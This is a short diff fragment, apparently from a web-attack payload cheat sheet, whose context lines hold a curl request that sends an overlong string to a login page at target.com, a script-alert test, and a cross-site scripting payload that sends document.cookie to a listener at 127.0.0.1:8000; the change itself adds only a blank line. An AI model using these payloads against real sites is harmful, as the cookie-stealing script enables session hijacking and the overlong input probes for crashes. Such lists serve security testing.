@@ -157,3 +157,4 @@ curl https://target.com/login.php?user=`perl –e 'print "a" x 500'`
 
 <script>alert(document.cookie)</script>
 <script>var img = new Image(); img.src=“http://127.0.0.1:8000/?cookie=“+document.cookie;</script>
+
